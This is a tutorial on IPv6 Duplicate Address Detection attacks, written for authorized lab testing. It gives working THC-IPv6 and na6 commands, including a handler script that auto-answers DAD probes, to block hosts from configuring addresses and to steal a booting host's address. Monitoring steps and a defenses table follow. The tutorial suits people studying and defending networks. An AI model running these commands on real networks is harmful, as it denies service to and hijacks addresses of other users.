# How to Test IPv6 Duplicate Address Detection Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, DAD, Duplicate Address Detection, Security Testing, NDP, DoS

Description: A guide to testing IPv6 Duplicate Address Detection (DAD) vulnerabilities including DAD DoS attacks and address theft in authorized lab environments.

IPv6 Duplicate Address Detection (DAD) is a mechanism where a host checks whether a new IPv6 address it wants to use is already in use on the link. By sending a Neighbor Solicitation for the tentative address and listening for conflicting Neighbor Solicitations or Neighbor Advertisements, DAD prevents address conflicts. However, DAD can be abused to prevent hosts from configuring addresses or to steal addresses.

**Warning**: Only test in authorized lab environments.

## How DAD Works

```text
Host (configuring tentative 2001:db8::10)
  |
  |-- NS (src ::, target 2001:db8::10) --> ff02::1:ff00:10 (solicited-node multicast)
  |
  | (waits RetransTimer, often ~1 second)
  |
  | No conflicting NS/NA = address is unique, proceed
  | Conflicting NS or valid NA received = DUPLICATE, address not used
```

## DAD DoS Attack: Preventing Address Configuration

By responding to every DAD probe with a fake NA, an attacker can prevent any host from configuring IPv6 addresses:

### Method 1: dos-new-ip6 (THC-IPv6)

```bash
# Respond to all DAD probes (prevents any host from getting an IPv6 address)

sudo dos-new-ip6 eth0

# Alternative mode: send a conflicting NS instead of an NA
sudo dos-new-ip6 -S eth0
```

### Method 2: fake_advertise6 (THC-IPv6)

```bash
# Advertise a specific address so DAD sees it as already in use
sudo fake_advertise6 eth0 2001:db8::10

# Send a single NA instead of advertising continuously
sudo fake_advertise6 -n 1 eth0 2001:db8::10
```

### Method 3: detect-new-ip6 + custom response

```bash
# Create a handler script:
#   $1 = detected IPv6 address
#   $2 = interface
cat >/tmp/respond-dad.sh <<'EOF'
#!/bin/sh
fake_advertise6 -n 1 "$2" "$1"
EOF

chmod +x /tmp/respond-dad.sh
sudo detect-new-ip6 eth0 /tmp/respond-dad.sh
```

## Address Theft via DAD

An attacker can "steal" a host's IPv6 address during DAD:

```bash
# When victim boots and begins DAD for its address, claim it first
# Monitor for DAD probes
sudo tcpdump -i eth0 -n 'icmp6 and ip6[40] == 135 and src host ::'

# When you see a NS with unspecified source (::) - it's a DAD probe
# Quickly send a single NA claiming ownership of that address
sudo fake_advertise6 -n 1 eth0 <detected_tentative_address>
```

## SI6 Networks Approach with na6

```bash
# Send a DAD-conflicting NA for 2001:db8::10
# (for DAD, the NA is multicast to ff02::1 and the Solicited flag stays clear)
sudo na6 -i eth0 \
  -s 2001:db8::10 \
  -d ff02::1 \
  -t 2001:db8::10 \
  -o \
  -e
```

## Monitoring DAD Activity

```bash
# Watch for DAD probes (NS with source ::)
sudo tcpdump -i eth0 -n -v 'icmp6 and ip6[40] == 135 and src host ::'

# Monitor address configuration events
sudo journalctl -f | grep -i "ipv6\|dad\|duplicate"

# Check ICMPv6 neighbor discovery counters
grep -E 'Icmp6(In|Out)Neighbor(Solicits|Advertisements)' /proc/net/snmp6
```

## Verifying DAD Settings

```bash
# Check number of DAD transmissions (0 = DAD disabled)
cat /proc/sys/net/ipv6/conf/eth0/dad_transmits

# Disable DAD (not recommended for production)
sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=0

# Use one DAD probe
sudo sysctl -w net.ipv6.conf.eth0.dad_transmits=1
```

## Defenses Against DAD Attacks

| Defense | Implementation |
|---|---|
| SEND (RFC 3971) | Cryptographically protects NDP, including DAD-related NS/NA |
| Enhanced DAD (RFC 7527) | Adds a nonce to DAD NS to avoid false duplicate detection from looped-back NS; it does not stop forged NA |
| NDPMon | Detects suspicious DAD / NDP activity |
| Port security | Limits which hosts can send NDP on access ports |
| IPv6 ND inspection / first-hop security | Switch-level validation and filtering of NS/NA |

```bash
# Monitor for DAD failures in syslog
sudo journalctl -f -u NetworkManager | grep -i duplicate
```

Understanding DAD attacks is important for IPv6 network security - particularly in environments without SEND, where any host on the segment can interfere with IPv6 address assignment.
